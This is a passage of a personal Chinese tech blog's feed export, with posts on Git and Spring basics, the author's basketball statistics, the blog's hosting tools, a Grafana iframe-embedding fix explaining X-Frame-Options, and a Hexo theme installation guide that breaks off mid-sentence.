        <content type="html"><![CDATA[<h1 id="实训day1-day2"><a href="#实训day1-day2" class="headerlink" title="实训day1-day2"></a>实训day1-day2</h1><p>目录:</p><ul><li><a href="#%E5%AE%9E%E8%AE%ADday1-day2">实训day1-day2</a><ul><li><a href="#git%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8">git工具的使用</a><ul><li><a href="#%E5%85%B3%E4%BA%8Egit%E7%9A%84%E5%8E%9F%E7%90%86">关于git的原理</a></li><li><a href="#git-%E5%B7%A5%E4%BD%9C%E6%B5%81">git 工作流</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9C%A8push%E4%B9%8B%E5%89%8D%E9%9C%80%E8%A6%81%E8%BF%9B%E8%A1%8Cpull">为什么在<code>push</code>之前需要进行<code>pull</code></a></li><li><a href="#git%E5%A4%84%E7%90%86%E5%86%B2%E7%AA%81">git处理冲突</a></li></ul></li><li><a href="#spring%E9%A1%B9%E7%9B%AE%E5%85%A5%E9%97%A8">spring项目入门</a><ul><li><a href="#java%E5%8F%8D%E5%B0%84">java反射</a></li><li><a href="#%E6%80%9D%E8%80%83">思考</a><ul><li><a href="#spring-ioc">Spring IOC</a></li><li><a href="#spring-%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5di">Spring 依赖注入DI</a></li></ul></li></ul></li></ul></li></ul><h2 id="git工具的使用"><a href="#git工具的使用" class="headerlink" title="git工具的使用"></a>git工具的使用</h2><h3 id="关于git的原理"><a href="#关于git的原理" class="headerlink" title="关于git的原理"></a>关于git的原理</h3><p>找到了一篇博客对于git的原理以及存储讲解的非常清楚</p><p><a href="https://zhaohuabing.com/post/2019-01-21-git/">https://zhaohuabing.com/post/2019-01-21-git/</a></p><h3 id="git-工作流"><a href="#git-工作流" class="headerlink" title="git 工作流"></a>git 工作流</h3><p>你的本地仓库由 git 维护的三棵“树”组成。第一个是你的 <code>工作目录</code>，它持有实际文件；第二个是 <code>缓存区（Index）</code>，它像个缓存区域，临时保存你的改动；最后是 <code>HEAD</code>，指向你最近一次提交后的结果。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210601113100.png" alt="20210601113100"></p><h3 id="为什么在push之前需要进行pull"><a href="#为什么在push之前需要进行pull" class="headerlink" title="为什么在push之前需要进行pull"></a>为什么在<code>push</code>之前需要进行<code>pull</code></h3><p>如果项目只有一个人，那无所谓。但是一般情况下，项目中都会有许多项目成员，在我们将自己的<code>分支 1</code> 合并到 <code>主分支 master</code>时，<code>主分支master</code>有可能已经发生改变(即成员2将自己的<code>分支2</code>合并到<code>主分支 master</code>之后<code>push</code>),此时如果直接<code>push</code>，会导致成员2所修改的部分被覆盖。</p><p>而在这之前进行<code>pull</code>操作，会把远程分支于本地分支进行合并。然后再进行<code>push</code></p><p>git可能会在这种情况下，禁止你进行push操作</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210601113613.png" alt="20210601113613"></p><h3 id="git处理冲突"><a href="#git处理冲突" class="headerlink" title="git处理冲突"></a>git处理冲突</h3><p>git并不能智能化地解决不同开发者修改同一个文件的情况。如果不同开发者对同一文件进行了修改，那么这个冲突的过程，必须要手动解决，然后再次提交。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210601114236.png" alt="20210601114236"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210601114412.png" alt="20210601114412"></p><p>日志</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210601114336.png" alt="20210601114336"></p><h2 id="spring项目入门"><a href="#spring项目入门" class="headerlink" title="spring项目入门"></a>spring项目入门</h2><p>  基础的创建项目+运行web项目 没什么可以说的</p><h3 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h3><p>具体去看博客:<a href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html">https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html</a></p><p><strong>反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。</strong><br>一般情况下，我们使用某个类时必定知道它是什么类，是用来做什么的。于是我们直接对这个类进行实例化，之后使用这个类对象进行操作。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Apple</span> apple <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//直接初始化，「正射」</span>apple<span class="token punctuation">.</span><span class="token function">setPrice</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而反射则是一开始并不知道我要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。<br>这时候，我们使用 JDK 提供的反射 API 进行反射调用：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> clz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.chenshuyi.reflect.Apple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Method</span> method <span class="token operator">=</span> clz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"setPrice"</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> clz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> object <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面两段代码的执行结果，其实是完全一样的。但是其思路完全不一样，第一段代码在未运行时就已经确定了要运行的类（Apple），而第二段代码则是在运行时通过字符串值才得知要运行的类（com.chenshuyi.reflect.Apple）</p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>为什么在浏览器中输入<a href="http://localhost:8080/index%E5%B0%B1%E8%83%BD%E5%A4%9F%E8%AE%BF%E9%97%AE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9A%84IndexController%E4%B8%AD%E7%9A%84index%E6%96%B9%E6%B3%95%EF%BC%9F">http://localhost:8080/index就能够访问到对应的IndexController中的index方法？</a></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/index"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"Lakers win"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单来说，就是在运行时，浏览器通过获取<code>/index</code>找到了IndexController这个类（可能是Spring容器在启动之前或者之后创建好的），然后调用方法index，向前端返回 Lakers win</p><h4 id="Spring-IOC"><a href="#Spring-IOC" class="headerlink" title="Spring IOC"></a>Spring IOC</h4><p>详见博客：<a href="https://www.cnblogs.com/ysocean/p/7466217.html">https://www.cnblogs.com/ysocean/p/7466217.html</a></p><p>IOC-Inversion of Control，即控制反转。它不是什么技术，而是一种设计思想。</p><p>&emsp;&emsp;传统的创建对象的方法是直接通过 new 关键字，而 spring 则是通过 IOC 容器来创建对象，也就是说我们将创建对象的控制权交给了 IOC 容器。我们可以用一句话来概括 IOC：</p><p>&emsp;&emsp;IOC 让程序员不在关注怎么去创建对象，而是关注与对象创建之后的操作，把对象的创建、初始化、销毁等工作交给spring容器来做。</p><p>项目加载时会扫描有注解<code>@RestController、@Controller、@Service、@Component</code>的类，通过反射创建这些类的对象放入Spring的容器 **(hashMap:key =》value —–indexController 名字 =》indexController的对象)**，需要使用的时候通过key直接取出来使用。</p><h4 id="Spring-依赖注入DI"><a href="#Spring-依赖注入DI" class="headerlink" title="Spring 依赖注入DI"></a>Spring 依赖注入DI</h4><p>详见：<a href="http://c.biancheng.net/view/4253.html">http://c.biancheng.net/view/4253.html</a></p><p>依赖注入（Dependency Injection，DI）和控制反转含义相同，它们是从两个角度描述的同一个概念。</p><p>当某个 Java 实例需要另一个 Java 实例时，传统的方法是由调用者创建被调用者的实例（例如，使用 new 关键字获得被调用者实例），而使用 Spring 框架后，被调用者的实例不再由调用者创建，而是由 Spring 容器创建，这称为控制反转。</p><p>Spring 容器在创建被调用者的实例时，会自动将调用者需要的对象实例注入给调用者，这样，调用者通过 Spring 容器获得被调用者实例，这称为依赖注入。</p><p>依赖注入主要有两种实现方式，分别是属性 setter 注入和构造方法注入。</p>]]></content>
      
      
      <categories>
          
          <category> 国信安实训 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>篮球比赛数据统计</title>
      <link href="/2021/05/28/lan-qiu-bi-sai-shu-ju-tong-ji/"/>
      <url>/2021/05/28/lan-qiu-bi-sai-shu-ju-tong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h1><table><thead><tr><th>日期</th><th>比赛名称</th><th>得分</th></tr></thead><tbody><tr><td>2019.5.中旬</td><td>学院院内赛-基准方中篮球赛(学院内不同年级组成的队伍)</td><td>具体数据忘了，但是场均应该能有个六七分，一共打了三场，大一非土木</td></tr><tr><td>2019.4.19</td><td>学工部篮球赛</td><td>17分、九投八中、一个三分、一个二加一</td></tr><tr><td>2021.5.9</td><td>Scuba(学校各个学院之间比赛)</td><td>对阵外国语 只得3分 三分六投一中，两个失误</td></tr><tr><td>2021.5.22</td><td>Scuba</td><td>对阵商学院、0分、两个失误</td></tr><tr><td>2021.5.28</td><td>Scuba</td><td>对阵软件 10分、五次启动走步、0助攻、中投3中2、两个上篮、一个二加一</td></tr><tr><td>2022.5.15</td><td>Scuba</td><td>五投对阵轻工学院。一中，二罚一中，一次失误，三四个犯规，得了四分</td></tr><tr><td>2022.5.21</td><td>Scuba</td><td>对阵材料学院。五投一中，五罚零中，两次犯规，三次失误。只得两分</td></tr><tr><td>2022.5.22</td><td>Scuba</td><td>对阵高分子学院。零分，五个篮板.两投零中,两次失误,一次助攻</td></tr></tbody></table><p>————2022.05.23</p><p>今年的篮球赛打的格外垃圾！几乎每一场都有空篮不进，实在是难堪大用。我自己对自己都很失望，确实也努力了很久。只能说还是技不如人。</p><p>最后一场打高分子，我的门牙还被撞碎了一点点，还好看不出来。</p><p>说实话自己的水平可能也就仅限于此了。再想提高，更多的还是要在身体上下大功夫。</p><p>也没有别的可说了，虽然32院一场都没赢，但是以后可能会赢把。难过之后，还得要继续努力呀！我知道你一定不会放弃的！</p><h1 id="记录没有别的目的，一方面是留念，但更多地是激励，希望自己能永远对🏀充满热情。—-2021-5-28"><a href="#记录没有别的目的，一方面是留念，但更多地是激励，希望自己能永远对🏀充满热情。—-2021-5-28" class="headerlink" title="记录没有别的目的，一方面是留念，但更多地是激励，希望自己能永远对🏀充满热情。—-2021.5.28"></a>记录没有别的目的，一方面是留念，但更多地是激励，希望自己能永远对🏀充满热情。—-2021.5.28</h1>]]></content>
      
      
      <categories>
          
          <category> 数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大学篮球 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用github托管网页，用到的工具总结</title>
      <link href="/2021/05/26/li-yong-github-tuo-guan-wang-ye-yong-dao-de-gong-ju-zong-lan/"/>
      <url>/2021/05/26/li-yong-github-tuo-guan-wang-ye-yong-dao-de-gong-ju-zong-lan/</url>
      
        <content type="html"><![CDATA[<h2 id="待做"><a href="#待做" class="headerlink" title="待做"></a>待做</h2><ul><li><input checked="" disabled="" type="checkbox"> 更改网页中js文件的cdn路径</li><li><input checked="" disabled="" type="checkbox"> 添加头像或者壁纸，看看作者的标语和文字是如何切换的</li><li><input disabled="" type="checkbox"> 想办法关一下背景音乐</li><li><input disabled="" type="checkbox"> 分析原因Travis 中运行hexo deloy总是<code>remote: Invalid username or password.fatal: Authentication failed fo</code></li><li><input checked="" disabled="" type="checkbox"> 续费腾讯的对象存储cos，方便传输图片</li><li><input disabled="" type="checkbox"> 将csdn上面的文件转过来</li></ul><h2 id="每一部分的作用详见首页-文章-Hexo主题LiveForCode介绍"><a href="#每一部分的作用详见首页-文章-Hexo主题LiveForCode介绍" class="headerlink" title="每一部分的作用详见首页 文章 Hexo主题LiveForCode介绍"></a>每一部分的作用详见首页 文章 Hexo主题LiveForCode介绍</h2><ul><li>Travis 就是方便部署hexo博客，不用每次自己在本地运行hexo deploy在上传GitHub, 检测到设定分支有push操作后，Travis会启动虚拟机帮你完成hexo generate和deploy的操作。关于这部分的配置参数，可以参考main分支的.travis.yml文件</li><li>LeanCloud 通过api把评论、留言、文章数据统计放到数据库里面，进入博客的时候，会再次请求数据库把这些数据显示在网页上。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210527113453.png" alt="20210527113453"></li><li>Algolia 搜索操作，会统计博客文章的标题和url相对路径。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210527113220.png" alt="20210527113220"></li><li>jsDelivr 免费的cdn加速。</li></ul><h2 id="利用github托管网页，用到的工具总结"><a href="#利用github托管网页，用到的工具总结" class="headerlink" title="利用github托管网页，用到的工具总结"></a>利用github托管网页，用到的工具总结</h2><h3 id="Hexo-博客框架"><a href="#Hexo-博客框架" class="headerlink" title="Hexo(博客框架)"></a>Hexo(博客框架)</h3><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h3 id="Travis-CI-方便对博客更改，自动渲染"><a href="#Travis-CI-方便对博客更改，自动渲染" class="headerlink" title="Travis CI(方便对博客更改，自动渲染)"></a>Travis CI(方便对博客更改，自动渲染)</h3><p>Travis CI 提供的是持续集成服务（Continuous Integration，简称 CI）。它绑定 Github 上面的项目，只要有新的代码，就会自动抓取。然后，提供一个运行环境，执行测试，完成构建，还能部署到服务器。</p><p>持续集成指的是只要代码有变更，就自动运行构建和测试，反馈运行结果。确保符合预期以后，再将新代码”集成”到主干。</p><p>持续集成的好处在于，每次代码的小幅变更，就能看到运行结果，从而不断累积小的变更，而不是在开发周期结束时，一下子合并一大块代码。</p><h3 id="Valine-一款快速、简洁且高效的无后端评论系统。"><a href="#Valine-一款快速、简洁且高效的无后端评论系统。" class="headerlink" title="Valine - 一款快速、简洁且高效的无后端评论系统。"></a>Valine - 一款快速、简洁且高效的无后端评论系统。</h3><p>Valine 诞生于2017年8月7日，是一款基于LeanCloud的快速、简洁且高效的无后端评论系统。</p><p>理论上支持但不限于静态博客，目前已有Hexo、Jekyll、Typecho、Hugo、Ghost 等博客程序在使用Valine。</p><h3 id="LeanCloud-（数据库-—评论、留言、文章数据统计"><a href="#LeanCloud-（数据库-—评论、留言、文章数据统计" class="headerlink" title="LeanCloud （数据库)—评论、留言、文章数据统计"></a>LeanCloud （数据库)—评论、留言、文章数据统计</h3><p>LeanCloud（原 AVOS Cloud） 是针对移动应用的一站式云端服务，专注于为应用开发者提供工具和平台。提供包括LeanStorage 数据存储、LeanMessage 通信服务、LeanAnalytics 统计分析、LeanModules 拓展模块等四大类型的后端云服务，加速应用开发。</p><h3 id="Algolia-Search-数据库-–文章标签、分类统计"><a href="#Algolia-Search-数据库-–文章标签、分类统计" class="headerlink" title="Algolia Search(数据库)–文章标签、分类统计"></a>Algolia Search(数据库)–文章标签、分类统计</h3><p>可以使用 GitHub 或者 Google 账户直接登录，注册后的 14 天内拥有所有功能（包括收费类别的）。之后若未续费会自动降级为免费账户，免费账户总共有 10,000 条记录，每月有 100,000 的可以操作数</p><h3 id="jsDelivr–js文件的cdn-free"><a href="#jsDelivr–js文件的cdn-free" class="headerlink" title="jsDelivr–js文件的cdn free"></a>jsDelivr–js文件的cdn free</h3><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p>]]></content>
      
      
      <categories>
          
          <category> 待办 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>grafana iframe嵌入不显示的问题</title>
      <link href="/2021/05/26/grafana-iframe-qian-ru-bu-xian-shi-de-wen-ti/"/>
      <url>/2021/05/26/grafana-iframe-qian-ru-bu-xian-shi-de-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="grafana-iframe嵌入不显示的问题"><a href="#grafana-iframe嵌入不显示的问题" class="headerlink" title="grafana iframe嵌入不显示的问题"></a>grafana iframe嵌入不显示的问题</h1><h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p><code>grafana\grafana\conf</code>目录下有两个配置文件<code>defaults.ini</code>、<code>sample.ini</code></p><ul><li><code>defaults.ini</code> 这个才是grafana服务器真正运行时的配置文件</li><li><code>sample.ini</code> 只是个样例，别改错了</li></ul><h2 id="开启匿名登录"><a href="#开启匿名登录" class="headerlink" title="开启匿名登录"></a>开启匿名登录</h2><p>修改<code>grafana\grafana\conf</code>目录下的<code>defaults.ini</code>文件中的 <code>[auth.anonymous]中的enabled = true</code></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210528084634.png" alt="20210528084634"></p><h2 id="允许浏览器渲染iframe"><a href="#允许浏览器渲染iframe" class="headerlink" title="允许浏览器渲染iframe"></a>允许浏览器渲染iframe</h2><p>修改上述文件中的<code>allow_embedding = true</code></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210528085103.png" alt="20210528085103"></p><h1 id="windows-server重启grafana服务"><a href="#windows-server重启grafana服务" class="headerlink" title="windows server重启grafana服务"></a>windows server重启grafana服务</h1><p>由于grafana在运行之后已经被当作一个服务，可以在服务管理页面对其进行重启</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210528085716.png" alt="20210528085716"></p><h1 id="不显示的原因"><a href="#不显示的原因" class="headerlink" title="不显示的原因"></a>不显示的原因</h1><p>grafana服务器响应头里面有一个<code>X-Frame-Options:deny</code></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210528085945.png" alt="20210528085945"></p><h2 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h2><p>The X-Frame-Options HTTP 响应头是用来给浏览器 指示允许一个页面 可否在 <code>&lt;frame&gt;, &lt;iframe&gt;, &lt;embed&gt; 或者 &lt;object&gt;</code> 中展现的标记。站点可以通过确保网站没有被嵌入到别人的站点里面，从而避免 clickjacking 攻击。</p><p>有三个可能值</p><pre class="line-numbers language-none"><code class="language-none">X-Frame-Options: denyX-Frame-Options: sameoriginX-Frame-Options: allow-from https:&#x2F;&#x2F;example.com&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果设置为 deny，不光在别人的网站 frame 嵌入时会无法加载，在同域名页面中同样会无法加载。另一方面，如果设置为sameorigin，那么页面就可以在同域名页面的 frame 中嵌套。</p><ul><li>deny <br><br>表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</li><li>sameorigin <br><br>表示该页面可以在相同域名页面的 frame 中展示。</li><li>allow-from url <br><br>表示该页面可以在指定来源的 frame 中展示。</li></ul><h2 id="修改之后，grafana服务器的响应头里不再包含这个字段"><a href="#修改之后，grafana服务器的响应头里不再包含这个字段" class="headerlink" title="修改之后，grafana服务器的响应头里不再包含这个字段"></a>修改之后，grafana服务器的响应头里不再包含这个字段</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210528091108.png" alt="20210528091108"><br>就可以显示了<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210528091142.png" alt="20210528091142"></p>]]></content>
      
      
      <categories>
          
          <category> 配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> grafana </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo主题LiveForCode介绍</title>
      <link href="/2020/08/01/hexo-zhu-ti-liveforcode-jie-shao/"/>
      <url>/2020/08/01/hexo-zhu-ti-liveforcode-jie-shao/</url>
      
        <content type="html"><![CDATA[<p><a href="https://hexo.io/zh-cn/">Hexo</a> 是高效的静态站点生成框架，他基于 <a href="https://nodejs.org/en/">Node.js</a>。通过 Hexo 你可以轻松地使用 <a href="https://daringfireball.net/projects/markdown/">Markdown</a> 编写文章，除了 Markdown 本身的语法之外，还可以使用 Hexo 提供的 <a href="https://hexo.io/zh-cn/docs/tag-plugins.html">标签插件</a> 来快速的插入特定形式的内容。在这篇文章中，假定你已经成功安装了 Hexo，并使用 Hexo 提供的命令创建了一个站点。  </p><blockquote><p>你可以访问 <a href="https://hexo.io/zh-cn/docs/">Hexo 的文档</a> 了解如何安装 Hexo  </p></blockquote><p>在 Hexo 中有两份主要的配置文件，其名称都是 <code>_config.yml</code>。其中，一份位于 Hexo 根目录下，主要包含 Hexo 本身的配置；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项。<br>为了描述方便，在以下说明中，将前者称为 <strong>站点配置文件</strong> ， 后者称为 <strong>主题配置文件</strong> 。  </p><h2 id="主题预览"><a href="#主题预览" class="headerlink" title="主题预览"></a>主题预览</h2><p><a href="https://www.notes.worstone.cn/">Hexo - Live For Code</a>  </p><h2 id="安装Live-For-Code"><a href="#安装Live-For-Code" class="headerlink" title="安装Live For Code"></a>安装Live For Code</h2><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至 Hexo 根目录的 themes 目录下，然后修改下配置文件即可。具体到 LiveForCode 来说，安装步骤如下。  </p><h3 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h3><p>如果你熟悉 Git，建议你使用 <code>克隆最新版本</code> 的方式，之后的更新可以通过 <code>git pull</code> 来快速更新，而不用再次下载压缩包替换。  </p><ol><li><p>克隆最新版本<br>在终端窗口下，定位到 Hexo 站点目录下。使用 Git Checkout 代码：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> your-hexo-site<span class="token function">git</span> clone https://github.com/first19326/hexo-liveforcode<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将克隆下来的文件夹中的 <code>LiveForCode</code> 文件夹移动至站点的 <code>themes</code> 目录下，并将 <code>source</code> 文件夹中的 <code>about</code>、<code>category</code>、<code>comment</code>、<code>donate</code>、<code>friend</code> 以及 <code>tag</code> 文件夹移动至 Hexo 站点目录下的 <code>source</code> 文件夹中。这些文件夹分别对应着 <strong>关于</strong> 、 <strong>标签</strong> 、 <strong>留言板</strong> 、 <strong>赞赏</strong> 、 <strong>友情链接</strong> 以及 <strong>分类</strong> 页面，其中的 <code>index.md</code> 中的内容为各个页面显示的内容，大家可以根据自己的情况进行修改。  </p></li><li><p>下载稳定版本<br>前往 LiveForCode 版本发布页面。<br>选择你所需要的版本，下载 Download 区域下的 Source Code (zip) 到本地。<br>解压所下载的压缩包，并将解压后的文件夹中的 <code>LiveForCode</code> 文件夹移动至站点的 <code>themes</code> 目录下，并将 <code>source</code> 文件夹中的 <code>about</code>、<code>category</code>、<code>comment</code>、<code>donate</code>、<code>friend</code> 以及 <code>tag</code> 文件夹移动至 Hexo 站点目录下的 <code>source</code> 文件夹中。这些文件夹分别对应着 <strong>关于</strong> 、 <strong>标签</strong> 、 <strong>留言板</strong> 、 <strong>赞赏</strong> 、 <strong>友情链接</strong> 以及 <strong>分类</strong> 页面，其中的 <code>index.md</code> 中的内容为各个页面显示的内容，大家可以根据自己的情况进行修改。  </p></li></ol><h3 id="启用主题"><a href="#启用主题" class="headerlink" title="启用主题"></a>启用主题</h3><p>与所有 Hexo 主题启用的模式一样。当 克隆/下载 完成后，打开 <strong>站点配置文件</strong> ，找到 theme 字段，并将其值更改为 <code>LiveForCode</code>。  </p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">theme</span><span class="token punctuation">:</span> LiveForCode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>到此，NexT 主题安装完成。下一步我们将验证主题是否正确启用。在切换主题之后、验证之前，我们最好使用 <code>hexo clean</code> 来清除 Hexo 的缓存。  </p><h3 id="验证主题"><a href="#验证主题" class="headerlink" title="验证主题"></a>验证主题</h3><p>首先启动 Hexo 本地站点，并开启调试模式（即加上 –debug），整个命令是 <code>hexo s --debug</code>。 在服务启动的过程，注意观察命令行输出是否有任何异常信息，如果你碰到问题，这些信息将帮助他人更好的定位错误。<br>当命令行输出中提示出： <code>INFO  Hexo is running at http://0.0.0.0:4000/. Press Ctrl+C to stop.</code> 此时即可使用浏览器访问 <code>http://localhost:4000</code>，检查站点是否正确运行。  </p><h2 id="站点设定"><a href="#站点设定" class="headerlink" title="站点设定"></a>站点设定</h2><p>在 <strong>站点配置文件</strong> 中，我修改了标签归档页面、分类归档页面以及文章归档页面的路径，如果大家使用默认的路径，则需要修改 <strong>主题配置文件</strong> 中的菜单设置。  </p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">tag_dir</span><span class="token punctuation">:</span> tag<span class="token key atrule">archive_dir</span><span class="token punctuation">:</span> archive<span class="token key atrule">category_dir</span><span class="token punctuation">:</span> category<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="主题设定"><a href="#主题设定" class="headerlink" title="主题设定"></a>主题设定</h2><p>由于 <strong>主题配置文件</strong> 可能有所改动，就不在这里给大家详细说明，我会在 <strong>主题配置文件</strong> 中添加适当的注释，麻烦大家参考页面以及注释内容进行修改。  </p><h2 id="404-页面设定"><a href="#404-页面设定" class="headerlink" title="404 页面设定"></a>404 页面设定</h2><p>主题中有相应的 <code>404</code> 错误页面，是单独的静态页面，没有添加到模板中。在使用主题的时候，需要大家将其中的 <strong>返回首页</strong> 的跳转链接 <code>https://notes.worstone.cn</code> 替换为自己网站的地址。<br>404 错误页面在主题文件夹 <code>LiveForCode</code> 中的 <code>source</code> 文件夹中。  </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>buttons<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:;<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>刷新页面<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://notes.worstone.cn<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_self<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>返回首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="第三方服务"><a href="#第三方服务" class="headerlink" title="第三方服务"></a>第三方服务</h2><h3 id="Algolia-Search"><a href="#Algolia-Search" class="headerlink" title="Algolia Search"></a>Algolia Search</h3><p>1.前往 <a href="https://www.algolia.com/">Algolia</a> 注册页面，注册一个新账户。 可以使用 GitHub 或者 Google 账户直接登录，注册后的 14 天内拥有所有功能（包括收费类别的）。之后若未续费会自动降级为免费账户，免费账户总共有 10,000 条记录，每月有 100,000 的可以操作数。注册完成后，创建一个新的 Index，这个 Index 将在后面使用。<br>2.Index 创建完成后，此时这个 Index 里未包含任何数据。 接下来需要安装 <code>Hexo Algolia</code> 扩展，这个扩展的功能是搜集站点的内容并通过 API 发送给 